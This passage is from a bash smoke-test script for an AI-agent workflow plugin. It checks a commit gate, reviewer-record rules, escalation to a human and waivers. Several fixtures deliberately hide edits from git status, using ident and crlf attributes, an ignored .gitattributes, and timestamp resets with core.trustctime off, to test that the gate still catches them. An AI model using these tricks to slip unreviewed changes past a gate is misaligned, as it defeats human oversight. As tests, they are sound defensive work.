has "lib/.git (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed files in a directory named .git"
rm -rf "$SM/lib/.git"; echo 'gitdir: /nonexistent' >"$SM/lib/.Git"
has "lib/.Git (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a .git file below the top"
rm -f "$SM/lib/.Git"
mkdir -p "$SM/.GIT"; echo x >"$SM/.GIT/conftest.py"
has ".GIT (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a top-level directory named .GIT"
rm -rf "$SM/.GIT"
# Run state never lives in a linked worktree: a .dev-plan-state there is checked.
git -C "$SM" worktree add -q "$SMOKE_TMP/smwt" 2>/dev/null
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")" ] || fail "a clean linked worktree with submodules was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")"
mkdir -p "$SMOKE_TMP/smwt/.dev-plan-state"; echo x >"$SMOKE_TMP/smwt/.dev-plan-state/conftest.py"
has ".dev-plan-state" "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")" || fail "the gate missed files in a .dev-plan-state directory inside a linked worktree"
rm -rf "$SMOKE_TMP/smwt/.dev-plan-state"
# A worktree whose .git file is swapped for a copy of its git dir is still a
# worktree: its .dev-plan-state is checked.
WG="$(git -C "$SMOKE_TMP/smwt" rev-parse --absolute-git-dir)"; rm -f "$SMOKE_TMP/smwt/.git"; cp -a "$WG" "$SMOKE_TMP/smwt/.git"
git -C "$SM" rev-parse --absolute-git-dir >"$SMOKE_TMP/smwt/.git/commondir"
mkdir -p "$SMOKE_TMP/smwt/.dev-plan-state"; echo x >"$SMOKE_TMP/smwt/.dev-plan-state/conftest.py"
has ".dev-plan-state/conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")" || fail "the gate missed .dev-plan-state in a worktree whose .git is a directory"
rm -rf "$SMOKE_TMP/smwt/.dev-plan-state"
# An untracked symlink (pytest follows it) is not in the head.
mkdir -p "$SMOKE_TMP/smext"; echo x >"$SMOKE_TMP/smext/conftest.py"; ln -s "$SMOKE_TMP/smext" "$SM/lib/ext"
has "lib/ext" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed an untracked symlink to a directory"
rm -f "$SM/lib/ext"
# A run without a worktree keeps its state in the checkout: unless committed
# rules ignore .dev-plan-state, the gate cannot show the tree is the head.
NW="$SMOKE_TMP/nw"; mkdir -p "$NW/plans"; git init -q -b main "$NW"; printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$NW/plans/n-plan.md"
git -C "$NW" add -A; git -C "$NW" commit -qm n; ( cd "$NW" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1 ) || true
has ".dev-plan-state" "$(source "$EX/_lib.sh"; apex_dirty "$NW")" || fail "a run without a worktree passed with its state directory not ignored"
printf '.dev-plan-state/\n' >"$NW/.gitignore"; git -C "$NW" add .gitignore; git -C "$NW" commit -qm ignore-state
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$NW")" ] || fail "a run without a worktree whose state is ignored was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$NW")"
# Names are bytes: an NFC twin of a tracked NFD directory is not in the head,
# and an NFD directory is not ignored by an NFC rule.
UN="$SMOKE_TMP/un"; mkdir -p "$UN/$(printf 'cafe\xcc\x81')"; git init -q -b main "$UN"; echo t >"$UN/$(printf 'cafe\xcc\x81')/t.py"; : >"$UN/$(printf 'cafe\xcc\x81')/conftest.py"
printf '/n\xc3\xa9/\n' >"$UN/.gitignore"; git -C "$UN" add -A; git -C "$UN" commit -qm u
mkdir -p "$UN/$(printf 'caf\xc3\xa9')"; echo x >"$UN/$(printf 'caf\xc3\xa9')/conftest.py"
has "conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$UN")" || fail "the gate missed an NFC twin of a tracked NFD directory"
mkdir -p "$UN/$(printf 'ne\xcc\x81')"; echo x >"$UN/$(printf 'ne\xcc\x81')/c.py"
has "c.py" "$(source "$EX/_lib.sh"; apex_dirty "$UN")" || fail "an NFD directory was taken as ignored by an NFC rule"
# Many entries in one directory are answered without stalling.
BG="$SMOKE_TMP/bg"; mkdir -p "$BG/data"; git init -q -b main "$BG"; printf '*.log\n' >"$BG/.gitignore"; echo k >"$BG/data/keep"; git -C "$BG" add -A; git -C "$BG" commit -qm b
python3 -c 'import sys
for i in range(12000): open("%s/data/f%06d%s.log" % (sys.argv[1], i, "x" * 60), "w").close()' "$BG"
[ -z "$(source "$EX/_lib.sh"; timeout 120 bash -c 'source "$1/_lib.sh"; apex_dirty "$2"' _ "$EX" "$BG" || echo stalled)" ] || fail "the inventory stalled or misreported a directory with 12000 ignored files"
# Attributes that convert bytes (ident) make git status vouch for other bytes
# of the same size: those files are compared with what a checkout writes.
ID="$SMOKE_TMP/id"; mkdir -p "$ID"; git init -q -b main "$ID"; printf 'v.py ident\n' >"$ID/.gitattributes"
printf 'v = "$Id$"\nprint("head")\n' >"$ID/v.py"; git -C "$ID" add -A; git -C "$ID" commit -qm i; git -C "$ID" worktree add -q "$SMOKE_TMP/idwt" 2>/dev/null
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/idwt")" ] || fail "a clean worktree with an ident file was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/idwt")"
python3 -c 'import sys
p = sys.argv[1]; b = open(p, "rb").read(); first, rest = b.split(b"\n", 1)
new = b"v = \"$Id: \"; print(\"NOT HEAD\"); x = \""
open(p, "wb").write(new + b" " * (len(first) - len(new) - 1) + b"$\n" + rest)' "$SMOKE_TMP/idwt/v.py"
has "v.py (differs from the head)" "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/idwt")" || fail "the gate missed same-size bytes that git status cleans to the head (ident)"
# Every tracked file is compared, not a list of converting attributes: the
# legacy crlf attribute cleans CRLF away, and git add refreshes the stat.
CR="$SMOKE_TMP/cr"; mkdir -p "$CR"; git init -q -b main "$CR"; printf 'gate.sh crlf=input\n' >"$CR/.gitattributes"
printf 'fail=1\nif [ "$fail" = 1 ]; then exit 1; fi\n' >"$CR/gate.sh"; git -C "$CR" add -A; git -C "$CR" commit -qm c
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$CR")" ] || fail "a clean repository with a crlf attribute was reported dirty"
printf 'fail=1\r\nif [ "$fail" = 1 ]; then exit 1; fi\n' >"$CR/gate.sh"; git -C "$CR" add gate.sh
[ -z "$(git -C "$CR" status --porcelain)" ] || fail "the crlf fixture is not hidden from git status (fixture broken)"
has "gate.sh (differs from the head)" "$(source "$EX/_lib.sh"; apex_dirty "$CR")" || fail "the gate missed CRLF bytes a crlf attribute hides from git status"
# What "a checkout of the head" writes comes from the head's attributes: an
# ignored, untracked .gitattributes cannot redefine it.
GA="$SMOKE_TMP/ga"; mkdir -p "$GA"; git init -q -b main "$GA"; printf '.*\n!/.gitignore\n' >"$GA/.gitignore"; printf 'a\nb\n' >"$GA/data.txt"
git -C "$GA" add -A; git -C "$GA" commit -qm g; printf 'data.txt eol=crlf\n' >"$GA/.gitattributes"; rm -f "$GA/data.txt"; git -C "$GA" checkout -- data.txt; git -C "$GA" add data.txt
[ -z "$(git -C "$GA" status --porcelain)" ] || fail "the ignored-.gitattributes fixture is not hidden from git status (fixture broken)"
has "data.txt (differs from the head)" "$(source "$EX/_lib.sh"; apex_dirty "$GA")" || fail "an ignored .gitattributes redefined what a checkout of the head writes"
# An untracked directory is not in the head even when it is empty.
mkdir -p "$GA/reports"; has "reports/ (an untracked directory)" "$(source "$EX/_lib.sh"; apex_dirty "$GA")" || fail "the gate missed an empty untracked directory"
rm -f "$GW/extra.txt"; echo BADD >"$GW/impl.txt"; git -C "$GW" commit -qam badd; git -C "$GW" config core.trustctime false
touch -r "$GW/impl.txt" "$SMOKE_TMP/g1.ref"; echo GOOD >"$GW/impl.txt"; touch -r "$SMOKE_TMP/g1.ref" "$GW/impl.txt"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate passed a same-size edit hidden by core.trustctime=false"
ok "land builds the reviewed tree (no -s ours revert, overlaps refused until refork, no merge drivers, submodules seen); refork resets reviews and G12; land re-runs finish; the gate binds to a clean head (submodules included) and allows ignored tool caches"

# 42. Portability (ADR-0003): version 0.4.1, ADR-0003 and ADR-0004 present, reviewer cannot
#     edit, ruflo optional (no required ruflo/claude-flow reference outside
#     docs/legacy/), apex-plan template profiles.
grep -q '"version": "0.4.1"' "$PLUGIN_ROOT/.claude-plugin/plugin.json" || fail "plugin.json is not version 0.4.1"
ADR4="$PLUGIN_ROOT/docs/adrs/0004-review-loop-calibration.md"
[ -f "$ADR4" ] && grep -qE "^- \*\*Status:\*\* Accepted" "$ADR4" && grep -q '^## What this loosens and why it is safe' "$ADR4" || fail "ADR-0004 missing, not Accepted, or without its loosening section"
ADR3="$PLUGIN_ROOT/docs/adrs/0003-portability-and-dispatch-consumer.md"
[ -f "$ADR3" ] && grep -qE "^- \*\*Status:\*\* (Proposed|Accepted)" "$ADR3" || fail "ADR-0003 missing or without a Status"
grep -qE "^disallowedTools:.*Edit.*Write.*NotebookEdit" "$GR" || fail "gibson-reviewer does not disallow Edit/Write/NotebookEdit"
MARKET_ROOT="$(cd "$PLUGIN_ROOT/../.." && pwd)"
RUFLO_HITS="$(grep -rIn -i 'ruflo\|claude-flow\|hooks_route\|swarm_init' "$PLUGIN_ROOT" "$MARKET_ROOT/plugins/apex-project-start" "$MARKET_ROOT/README.md" 2>/dev/null \
  | grep -v '/docs/legacy/' | grep -v '/scripts/smoke.sh:' | grep -iv 'optional\|APEX_MEMORY_CMD' || true)"
[ -z "$RUFLO_HITS" ] || fail "ruflo/claude-flow referenced as required outside docs/legacy/: $(printf '%s' "$RUFLO_HITS" | head -3)"
for prof in generic apex; do for t in adr-template.md plan-template.md; do
  [ -f "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/$prof/$t" ] || fail "apex-plan profile $prof lacks $t"
done; done
! grep -qi 'getapexinsights\|apex-app' "$PLUGIN_ROOT"/skills/apex-plan/resources/templates/profiles/generic/*.md || fail "the generic apex-plan profile carries Apex-specific vocabulary"
ok "portability: version 0.4.1, ADR-0003, ADR-0004, read-only reviewer edits, ruflo optional, apex-plan profiles"

# 43. apex-dispatch Phase 3.2 consumers: green-gate.sh check PASS moves the ACTIVE
#     lock BUILD -> GATE (only from BUILD; a FAIL leaves it); checkpoint.sh review
#     refuses a record the transcript audit refused and takes the provider from the
#     record; in provenance mode complete enforces the review shape (six distinct
#     lens approvals + adversarial for fanout6+adversarial) and reviewer family
#     diversity, degrading to a ledgered warning when doctor.json shows no second family.
P3="$SMOKE_TMP/p32"; mkdir -p "$P3/plans"; git init -q -b main "$P3"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$P3/plans/c-plan.md"; git -C "$P3" add -A; git -C "$P3" commit -qm p
( cd "$P3" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init for the Phase 3.2 checks failed"
P3S="$(st "$P3" plans/c-plan.md)"; P3W="$P3S/worktree"; P3O="$(dirname "$P3S")/ACTIVE/owner.json"
p3sha() { git -C "$P3W" rev-parse HEAD; }
p3stage() { python3 -c 'import json, sys; o = json.load(open(sys.argv[1])); print(o["stage"]) if len(sys.argv) == 2 else (o.update(stage=sys.argv[2]), json.dump(o, open(sys.argv[1], "w")))' "$P3O" "$@"; }
( cd "$P3" && source "$EX/_lib.sh" && apex_resolve plans/c-plan.md && apex_lock_acquire "$PLAN_HASH" "$PLAN_ABS" 1 BUILD ) || fail "could not take the ACTIVE lock"
echo b >"$P3W/b.md"; git -C "$P3W" add -A; git -C "$P3W" commit -qm b
has "GATE: FAIL" "$(cd "$P3" && APEX_GATE_TEST=false "$EX/green-gate.sh" plans/c-plan.md check 2>&1)" && [ "$(p3stage)" = BUILD ] || fail "a failing gate moved the stage off BUILD"
(cd "$P3" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1) && [ "$(p3stage)" = GATE ] || fail "a passing gate did not move the stage BUILD -> GATE"
for s in REVIEW DONE; do
  p3stage "$s"; (cd "$P3" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1); [ "$(p3stage)" = "$s" ] || fail "a passing gate moved the stage off $s"
done
p3stage BUILD
mkdir -p "$P3S/dispatch/reviews-raw"
raw() {  # raw ID ROLE [VERDICT] [PROVIDER]
  python3 -c 'import json, sys
i, role, verdict, prov, head = sys.argv[2:7]
json.dump({"record_id": "rec-" + i + "-0001", "line": 1, "head_sha": head, "sha": head, "role": role, "verdict": verdict,
           "provider": prov, "family": "anthropic" if prov == "claude-session" else "x"}, open(sys.argv[1], "w"))' \
    "$P3S/dispatch/reviews-raw/$1.json" "$1" "$2" "${3:-APPROVE}" "${4:-claude-session}" "$(p3sha)"
}
printf '{"agent_id": "bad1", "refused": "read-only role reviewer (agent bad1) changed the repository: Bash git commit"}' >"$P3S/dispatch/reviews-raw/bad1.json"
expect_refusal "a record refused by the transcript audit" "refused by apex-dispatch's transcript audit" indir "$P3" "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id bad1
raw l1 lens:correctness
(cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id l1 --provider codex >/dev/null) || fail "a lens record was refused"
python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))["reviews"]["1"]["records"][-1]; assert r["provider"]=="claude-session" and r["role"]=="lens:correctness", r' "$P3S/checkpoint.json" \
  || fail "the review record took the caller's --provider instead of the record's"
for l in security consent-pii money performance; do i="l$(printf '%s' "$l" | tr -dc a-z)"; raw "$i" "lens:$l"; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id "$i" >/dev/null) || fail "lens $l refused"; done
raw adv adversarial; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id adv >/dev/null) || fail "the adversarial record was refused"
python3 - "$P3S/checkpoint.json" "$(p3sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {})["1"] = {"tier": "C", "head": h}; json.dump(s, open(p, "w"))
PY
(cd "$P3" && "$CP" plans/c-plan.md approve 1 "$(p3sha)" "approve G12 1" >/dev/null)
mkdir -p "$SMOKE_TMP/fd43/scripts"; printf '#!/bin/sh\nexit 0\n' >"$SMOKE_TMP/fd43/scripts/route.sh"
printf '#!/bin/sh\necho "$*" >>"$(dirname "$0")/calls.log"\nexit 0\n' >"$SMOKE_TMP/fd43/scripts/ledger.sh"; chmod +x "$SMOKE_TMP/fd43/scripts/"*.sh
expect_refusal "Tier C with five lenses" "six distinct lens approvals" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
# A typed (declared) record never counts toward the lenses in provenance mode.
python3 - "$P3S/checkpoint.json" "$(p3sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p))
s["reviews"]["1"]["records"].append({"attempt": s["reviews"]["1"].get("attempt", 1), "epoch": s.get("epoch", 0), "sha": h,
    "verdict": "APPROVE", "role": "lens:maintainability", "provenance": "declared", "source": ""})
json.dump(s, open(p, "w"))
PY
expect_refusal "a declared lens record counted in provenance mode" "six distinct lens approvals" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
raw lm lens:maintainability; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id lm >/dev/null) || fail "the sixth lens record was refused"
# The shared second-family rule needs apex-dispatch's ledger.py beside the fake root.
mkdir -p "$SMOKE_TMP/fd43/scripts/lib" "$SMOKE_TMP/fd43/resources"; cp "$MARKET_ROOT/plugins/apex-dispatch/scripts/lib/ledger.py" "$SMOKE_TMP/fd43/scripts/lib/"
# A non-approving review at this head is final: neither an unrecorded raw record nor a ledger verdict row can be discarded.
raw rsec2 lens:security REQUEST_CHANGES
expect_refusal "an unrecorded REQUEST_CHANGES raw record at HEAD" "did not approve" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
rm -f "$P3S/dispatch/reviews-raw/rsec2.json"
raw unp1 reviewer UNPARSED
expect_refusal "an UNPARSED (unreadable verdict) raw record at HEAD" "did not approve" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
rm -f "$P3S/dispatch/reviews-raw/unp1.json"
raw stl1 lens:security; python3 -c 'import json,sys; r=json.load(open(sys.argv[1])); r["stale"]="HEAD moved"; json.dump(r, open(sys.argv[1], "w"))' "$P3S/dispatch/reviews-raw/stl1.json"
expect_refusal "a stale raw record" "is stale" indir "$P3" "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id stl1
printf '{"event": "verdict", "source": "hook", "line": 1, "head_sha": "%s", "verdict": "REQUEST_CHANGES", "agent_id": "gone", "seq": 0}\n' "$(p3sha)" >"$P3S/dispatch/ledger.jsonl"
expect_refusal "a REQUEST_CHANGES verdict row at HEAD" "did not approve" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
printf '{"agent_id": "bad2", "refused": "audit", "head_sha": "%s", "line": 1}' "$(p3sha)" >"$P3S/dispatch/reviews-raw/bad2.json"
rm -f "$P3S/dispatch/ledger.jsonl"
expect_refusal "an audit-refused record at HEAD" "refused by the transcript audit" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
# Only a new commit (and fresh reviews of it) supersedes them.
echo c >"$P3W/c.md"; git -C "$P3W" add -A; git -C "$P3W" commit -qm c; p3stage BUILD
(cd "$P3" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1) || fail "the gate failed on the new head"
python3 - "$P3S/checkpoint.json" "$(p3sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {})["1"] = {"tier": "C", "head": h}; json.dump(s, open(p, "w"))
PY
(cd "$P3" && "$CP" plans/c-plan.md approve 1 "$(p3sha)" "approve G12 1" >/dev/null)
for l in correctness security consent-pii money performance maintainability; do
  i="n$(printf '%s' "$l" | tr -dc a-z)"; raw "$i" "lens:$l"; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id "$i" >/dev/null) || fail "new-head lens $l refused"
done
raw nadv adversarial; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id nadv >/dev/null) || fail "new-head adversarial refused"
# Diversity: a second family counts only when doctor shows it available (and, since apex-dispatch 0.3.0,
# verified, allowed to review and allowed the route's class) AND its bin/worker-*.sh shim ships.
printf '{"claude_p_auth": "available", "providers": {"claude-p": {"enabled": true, "available": true, "verified": true, "roles_allowed": ["reviewer"], "allowed_classes": ["security"]}}}' >"$P3S/dispatch/doctor.json"
mkdir -p "$SMOKE_TMP/fd43/bin"; printf '#!/bin/sh\nexit 0\n' >"$SMOKE_TMP/fd43/bin/worker-claude-p.sh"; chmod +x "$SMOKE_TMP/fd43/bin/worker-claude-p.sh"
expect_refusal "Tier C without a second family while its shim ships" "family diversity (block)" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
rm -f "$SMOKE_TMP/fd43/bin/worker-claude-p.sh"
OUT="$(cd "$P3" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok 2>&1)" || fail "Tier C with no shipped second-family shim did not complete: $OUT"
has 'warning: reviewer family diversity (block)' "$OUT" && grep -q '^evidence ' "$SMOKE_TMP/fd43/scripts/calls.log" \
  && grep -q '^append hook_advisory .*family diversity.* --source cli' "$SMOKE_TMP/fd43/scripts/calls.log" || fail "the diversity degrade was not warned and ledgered, or evidence was not asked"
[ "$(p3stage)" = DONE ] || fail "complete did not move the stage to DONE"
ok "Phase 3.2: green-gate PASS = BUILD -> GATE (only from BUILD); refused raw records refused; provider from the record; provenance complete needs six canonical lenses + adversarial (declared records do not count), refuses any non-approving or unreadable (UNPARSED) review at HEAD until a new commit, refuses stale records, and needs family diversity only when a second family has a shipped shim (else a ledgered warning); DONE"

# --- ADR-0004: review-loop calibration (checks 44-50) ---------------------------
# cal_run DIR PLAN_TEXT — a fresh repository with plans/v-plan.md, initialised
# (harness on for complete); prints the worktree.
cal_run() {
  mkdir -p "$1/plans"; git init -q -b main "$1"; printf '%b' "$2" >"$1/plans/v-plan.md"
  git -C "$1" add -A; git -C "$1" commit -qm v
  ( cd "$1" && APEX_GIBSON=0 "$EX/init.sh" plans/v-plan.md >/dev/null 2>&1 ) || return 1
  printf '%s\n' "$(st "$1" plans/v-plan.md)/worktree"
}
vc() { local d="$1"; shift; ( cd "$d" && "$CP" plans/v-plan.md "$@" ); }
wcommit() { echo "$2" >>"$1/$3"; git -C "$1" add -A; git -C "$1" commit -qm "$2"; git -C "$1" rev-parse HEAD; }
TWO='- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n'

# 44. Threat model before review: the brief prints a THREAT_MODEL block from the
#     task's Threat: directive, else the plan's "## Threat model" section (author
#     notes in blockquotes left out), else the default; templates, the reviewer
#     agents and iterate.md carry it.
T44="$SMOKE_TMP/t44"; TW="$(cal_run "$T44" '# T\n\n## Threat model\n\nOnly accidents by the trusted agent.\n> author note, not for reviewers\n\n## Tasks\n\n- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Threat: task-level model\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n')" || fail "init for check 44 failed"
B44="$(brief "$T44" plans/v-plan.md)"
has '^THREAT_MODEL: source task$' "$B44" && has '^  > task-level model$' "$B44" || fail "the brief did not print the task's Threat: directive as THREAT_MODEL"
O44="$(python3 "$EX/planlib.py" threat "$T44/plans/v-plan.md" 13)"
has '^SOURCE: plan$' "$O44" && has '^Only accidents by the trusted agent.$' "$O44" && ! has 'author note' "$O44" || fail "the plan's Threat model section was not used (or kept author notes): $O44"
printf -- "$TWO" >"$SMOKE_TMP/t44-noth.md"
has '^SOURCE: default$' "$(python3 "$EX/planlib.py" threat "$SMOKE_TMP/t44-noth.md" 1)" && has 'deliberate tampering with state, config or the harness' "$(python3 "$EX/planlib.py" threat "$SMOKE_TMP/t44-noth.md" 1)" \
  || fail "a plan without a threat model did not get the default"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Threat: x\n  - Threat: y\n' >"$SMOKE_TMP/t44-dup.md"
has 'Threat: given more than once' "$(python3 "$EX/planlib.py" validate "$SMOKE_TMP/t44-dup.md" 2>&1 || true)" || fail "a repeated Threat: directive was not refused"
for prof in generic apex; do
  TP="$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/$prof/plan-template.md"
  grep -q '^## Threat model$' "$TP" && grep -q 'Threat: {one line}' "$TP" && has '^SOURCE: plan$' "$(python3 "$EX/planlib.py" threat "$TP")" || fail "the $prof plan template lacks the Threat model section or the Threat: directive"
done
for f in "$GR" "$PLUGIN_ROOT/commands/iterate.md" "$MARKET_ROOT/plugins/apex-dispatch/agents/reviewer.md" "$MARKET_ROOT/plugins/apex-dispatch/agents/adversarial-reviewer.md"; do
  grep -q 'THREAT_MODEL' "$f" && grep -q 'BUDGET' "$f" || fail "$(basename "$f") does not pass the threat model and budget to reviewers"
done
grep -q 'verbatim' "$PLUGIN_ROOT/commands/iterate.md" && grep -q '^## Severity bar' "$GR" && grep -q 'MODE' "$GR" || fail "iterate.md / gibson-reviewer lack the verbatim threat model, severity bar or MODE input"
ok "threat model: task directive > plan section > default in the brief; templates and reviewer prompts carry it with the severity bar"

# 45. Diff-scoped re-reviews: LAST_REVIEWED / REVIEW_ROUND / REVIEW_MODE from the
#     current attempt's reviews; ADVERSARY_BUDGET from APEX_ADVERSARY_BUDGET.
T45="$SMOKE_TMP/t45"; TW="$(cal_run "$T45" "$TWO")" || fail "init for check 45 failed"
B45="$(brief "$T45" plans/v-plan.md)"
has '^LAST_REVIEWED: none$' "$B45" && has '^REVIEW_ROUND: 1$' "$B45" && has '^REVIEW_MODE: full$' "$B45" && has '^ADVERSARY_BUDGET: 3$' "$B45" \
  || fail "a fresh task's brief is not round 1 / full / budget 3"
has '^ADVERSARY_BUDGET: 5$' "$( (cd "$T45" && APEX_ADVERSARY_BUDGET=5 "$EX/iterate.sh" plans/v-plan.md) 2>&1)" || fail "APEX_ADVERSARY_BUDGET was not surfaced"
has '^ADVERSARY_BUDGET: 3$' "$( (cd "$T45" && APEX_ADVERSARY_BUDGET=lots "$EX/iterate.sh" plans/v-plan.md) 2>&1)" || fail "an invalid APEX_ADVERSARY_BUDGET was not replaced by the default"
S1="$(wcommit "$TW" r1 a.md)"; vc "$T45" review 1 "$S1" REQUEST_CHANGES >/dev/null
B45="$(brief "$T45" plans/v-plan.md)"
has "^LAST_REVIEWED: $S1$" "$B45" && has '^REVIEW_ROUND: 2$' "$B45" && has '^REVIEW_MODE: verify$' "$B45" || fail "after a REQUEST_CHANGES the brief is not round 2 / verify since the reviewed SHA"
S2="$(wcommit "$TW" r2 a.md)"; vc "$T45" review 1 "$S2" APPROVE --role lens:security >/dev/null
B45="$(brief "$T45" plans/v-plan.md)"
has "^LAST_REVIEWED: $S2$" "$B45" && has '^REVIEW_ROUND: 2$' "$B45" || fail "a head whose reviews are still coming in did not keep its round"
vc "$T45" fail 1 "retry" >/dev/null
B45="$(brief "$T45" plans/v-plan.md)"
has '^LAST_REVIEWED: none$' "$B45" && has '^REVIEW_ROUND: 1$' "$B45" && has '^REVIEW_MODE: full$' "$B45" || fail "a new attempt did not start with a full round 1"
grep -q 'REVIEW_MODE\|MODE: verify' "$PLUGIN_ROOT/commands/iterate.md" && grep -q 'PRIOR_FINDINGS' "$PLUGIN_ROOT/commands/iterate.md" && grep -q 'PRIOR_FINDINGS' "$GR" || fail "iterate.md / the reviewer do not document verify-only rounds"
ok "re-reviews: LAST_REVIEWED, REVIEW_ROUND and REVIEW_MODE per attempt; ADVERSARY_BUDGET in the brief"

# 46. Earlier escalation: ASK_HUMAN after REQUEST_CHANGES in APEX_ASK_HUMAN_AFTER
#     (default 2) rounds of the current attempt, not before.
T46="$SMOKE_TMP/t46"; TW="$(cal_run "$T46" "$TWO")" || fail "init for check 46 failed"
S1="$(wcommit "$TW" a1 a.md)"; ! has '^ASK_HUMAN:' "$(vc "$T46" review 1 "$S1" REQUEST_CHANGES 2>&1)" || fail "ASK_HUMAN after one round"
S2="$(wcommit "$TW" a2 a.md)"; ! has '^ASK_HUMAN:' "$(cd "$T46" && APEX_ASK_HUMAN_AFTER=3 "$CP" plans/v-plan.md review 1 "$S2" REQUEST_CHANGES lens-x --role lens:money 2>&1)" || fail "ASK_HUMAN before APEX_ASK_HUMAN_AFTER rounds"
O46="$(vc "$T46" review 1 "$S2" REQUEST_CHANGES 2>&1)"
has "^ASK_HUMAN: line 1 has REQUEST_CHANGES in 2 review rounds" "$O46" && has "waive 1 $S2" "$O46" || fail "no ASK_HUMAN after REQUEST_CHANGES in 2 rounds: $O46"
ok "ASK_HUMAN after REQUEST_CHANGES in APEX_ASK_HUMAN_AFTER rounds of the attempt"

# 47. The waiver: recorded only with the human's literal reply ('waive LINE') and
#     a named risk, for a SHA with REQUEST_CHANGES in this attempt; binds to SHA,
#     epoch and attempt; never skips the gate or G12; recorded as waived, never
#     approved; in provenance mode it is ledgered and lifts only REQUEST_CHANGES.
T47="$SMOKE_TMP/t47"; TW="$(cal_run "$T47" "$TWO")" || fail "init for check 47 failed"
T47S="$(st "$T47" plans/v-plan.md)"
W1="$(wcommit "$TW" w1 a.md)"; vc "$T47" review 1 "$W1" REQUEST_CHANGES >/dev/null
W2="$(wcommit "$TW" w2 a.md)"; vc "$T47" review 1 "$W2" REQUEST_CHANGES >/dev/null
expect_refusal "a waiver without the human's reply" "literal reply is required" vc "$T47" waive 1 "$W2" "" "risk"
expect_refusal "a waiver whose reply does not say 'waive 1'" "does not start with 'waive 1'" vc "$T47" waive 1 "$W2" "sure, ship it" "risk"
expect_refusal "a waiver for another line's number" "does not start with 'waive 1'" vc "$T47" waive 1 "$W2" "waive 11" "risk"
expect_refusal "a waiver without the accepted risk" "name the residual risk" vc "$T47" waive 1 "$W2" "waive 1" " "
expect_refusal "a waiver for a SHA nobody rejected" "nothing to waive" vc "$T47" waive 1 "$(git -C "$TW" rev-parse HEAD~2)" "waive 1" "risk"
vc "$T47" waive 1 "$W1" "waive 1" "old head" >/dev/null || fail "a waiver at an earlier rejected SHA was refused"
(cd "$T47" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null) || fail "gate/tier for check 47 failed"
expect_refusal "a waiver at another SHA" "requested changes" vc "$T47" complete 1 ok
vc "$T47" waive 1 "$W2" "waive 1 — accept it" "cache edge under tampering" >/dev/null || fail "a valid waiver was refused"
rm -f "$T47S/gate/last.json"
expect_refusal "a waiver that skips the green gate" "no green-gate result" vc "$T47" complete 1 ok
